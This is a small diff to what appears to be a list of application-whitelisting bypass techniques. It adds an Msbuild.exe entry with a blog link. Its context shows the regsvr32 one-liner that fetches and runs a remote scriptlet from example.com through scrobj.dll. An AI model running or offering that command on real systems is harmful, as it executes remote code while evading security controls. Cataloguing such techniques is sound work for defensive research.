@@ -52,5 +52,9 @@ https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bia
     This one is just simply amazing... 
     regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
 
+13. Msbuild.exe
+    http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html
+
+
 
 I'd love to hear other techniques
